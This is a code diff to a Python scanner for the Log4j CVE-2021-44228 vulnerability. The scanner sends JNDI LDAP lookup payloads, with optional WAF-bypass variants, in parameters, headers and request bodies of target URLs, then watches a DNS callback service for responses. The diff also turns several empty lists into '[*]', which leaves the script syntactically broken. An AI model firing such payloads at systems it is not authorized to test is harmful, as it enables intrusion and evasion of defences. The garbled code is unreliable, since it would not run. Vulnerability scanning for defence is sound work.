@@ -33,9 +33,9 @@ except Exception:
     pass
 
 
-cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
-cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
-cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")
+cprint('[*] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
+cprint('[*] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
+cprint('[*] Secure your External Attack Surface with FullHunt.io.', "yellow")
 
 if len(sys.argv) <= 1:
     print('\n%s -h for help.' % (sys.argv[0]))
@@ -62,10 +62,6 @@ parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
                     dest="url",
                     help="Check a single URL.",
-                    action='store')
-parser.add_argument("-p", "--proxy",
-                    dest="proxy",
-                    help="send requests through proxy",
                     action='store')
 parser.add_argument("-l", "--list",
                     dest="usedlist",
@@ -136,7 +132,7 @@ def get_fuzzing_post_data(payload):
 
 
 def generate_waf_bypass_payloads(callback_host, random_string):
-    payloads = []
+    payloads = [*]
     for i in waf_bypass_payloads:
         new_payload = i.replace("{{callback_host}}", callback_host)
         new_payload = new_payload.replace("{{random}}", random_string)
@@ -191,7 +187,7 @@ class Interactsh:
             raise Exception("Can not initiate interact.sh DNS callback client")
 
     def pull_logs(self):
-        result = []
+        result = [*]
         url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
         res = self.session.get(url, headers=self.headers, timeout=30).json()
         aes_key, data_list = res['aes_key'], res['data']
@@ -243,7 +239,7 @@ def parse_url(url):
             "file_path": file_path})
 
 
-def scan_url(url, callback_host, proxies):
+def scan_url(url, callback_host):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
     payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
@@ -251,7 +247,7 @@ def scan_url(url, callback_host, proxies):
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
     for payload in payloads:
-        cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
+        cprint(f"[*] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
             try:
                 requests.request(url=url,
@@ -259,8 +255,7 @@ def scan_url(url, callback_host, proxies):
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  verify=False,
-                                 timeout=timeout,
-                                 proxies=proxies)
+                                 timeout=timeout)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
@@ -273,8 +268,7 @@ def scan_url(url, callback_host, proxies):
                                  headers=get_fuzzing_headers(payload),
                                  data=get_fuzzing_post_data(payload),
                                  verify=False,
-                                 timeout=timeout,
-                                 proxies=proxies)
+                                 timeout=timeout)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
@@ -286,14 +280,13 @@ def scan_url(url, callback_host, proxies):
                                  headers=get_fuzzing_headers(payload),
                                  json=get_fuzzing_post_data(payload),
                                  verify=False,
-                                 timeout=timeout,
-                                 proxies=proxies)
+                                 timeout=timeout)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
 
 def main():
-    urls = []
+    urls = [*]
     if args.url:
         urls.append(args.url)
     if args.usedlist:
@@ -306,10 +299,10 @@ def main():
 
     dns_callback_host = ""
     if args.custom_dns_callback_host:
-        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
+        cprint(f"[*] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
         dns_callback_host =  args.custom_dns_callback_host
     else:
-        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
+        cprint(f"[*] Initiating DNS callback server ({args.dns_callback_provider}).")
         if args.dns_callback_provider == "interact.sh":
             dns_callback = Interactsh()
         elif args.dns_callback_provider == "dnslog.cn":
@@ -320,22 +313,19 @@ def main():
 
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
     for url in urls:
-        cprint(f"[•] URL: {url}", "magenta")
-        proxies = {}
-        if args.proxy:
-            proxies = {"http": args.proxy, "https": args.proxy}
-        scan_url(url, dns_callback_host, proxies)
+        cprint(f"[*] URL: {url}", "magenta")
+        scan_url(url, dns_callback_host)
 
     if args.custom_dns_callback_host:
-        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
+        cprint("[*] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
         return
 
-    cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
-    cprint("[•] Waiting...", "cyan")
+    cprint("[*] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
+    cprint("[*] Waiting...", "cyan")
     time.sleep(args.wait_time)
     records = dns_callback.pull_logs()
     if len(records) == 0:
-        cprint("[•] Targets does not seem to be vulnerable.", "green")
+        cprint("[*] Targets does not seem to be vulnerable.", "green")
     else:
         cprint("[!!!] Target Affected", "yellow")
         for i in records:
